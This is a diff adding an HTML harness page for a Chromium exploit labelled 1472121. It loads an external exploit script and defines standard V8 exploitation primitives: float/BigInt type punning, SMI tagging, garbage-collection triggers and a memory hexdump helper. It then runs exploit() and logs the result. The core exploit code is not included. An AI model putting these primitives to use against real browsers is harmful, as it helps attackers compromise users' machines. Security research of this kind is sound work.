@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Chromium 1472121 Exploit</title>
+        <link rel="icon" href="data:;base64,=">
+    </head>
+
+    <body>
+        <pre id="log"></pre>
+        <script src="1472121_min.js"></script>
+        <script name="helper">
+            var arr_buf = new ArrayBuffer(8);
+            var f64_arr = new Float64Array(arr_buf);
+            var b64_arr = new BigInt64Array(arr_buf);
+
+            function ftoi(fl) {
+                f64_arr[0] = fl;
+                return b64_arr[0];
+            }
+
+            function itof(i) {
+                b64_arr[0] = i;
+                return f64_arr[0];
+            }
+
+            function smi(i) {
+                return i << 1n;
+            }
+
+            function gc_minor() { //scavenge
+                for(let i = 0; i < 1000; i++) {
+                    new ArrayBuffer(0x10000);
+                }
+            }
+
+            function gc_major() { //mark-sweep
+                new ArrayBuffer(0x7fe00000);
+            }
+
+            function hex(value) {
+                return "0x" + ("00000000" + value.toString(16).toUpperCase()).slice(-8);
+            }
+
+            function hex64(value) {
+                return "0x" + ("0000000000000000" + value.toString(16).toUpperCase()).slice(-16);
+            }
+
+            function hexdump(ptr, length) {
+                let num = Math.floor(length / 0x10);
+                let dump = "";
+                for (let i = 0; i < num; ++i) {
+                    let offset = 0x10 * i;
+                    let s = "\n" + hex(offset);
+                    s += ": " + hex(read_ptr(ptr, offset + 0));
+                    s += ", " + hex(read_ptr(ptr, offset + 4));
+                    s += ", " + hex(read_ptr(ptr, offset + 8));
+                    s += ", " + hex(read_ptr(ptr, offset + 12));
+                    dump += s;
+                }
+                console.log(dump + "\n");
+            }
+
+            async function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            function print(str) {
+                console.log(str);
+                var log = document.getElementById("log");
+                if (log) {
+                    log.innerText += str + "\n";
+                }
+            }
+            function stable() {
+                return [1.1,1.1,1.1];
+            }
+
+            print("[+] Start exploit");
+            let res = exploit();
+            print(res);
+            // while (!res) {
+            //     res = exploit();
+            // };
+        </script>
+    </body>
+
+</html>
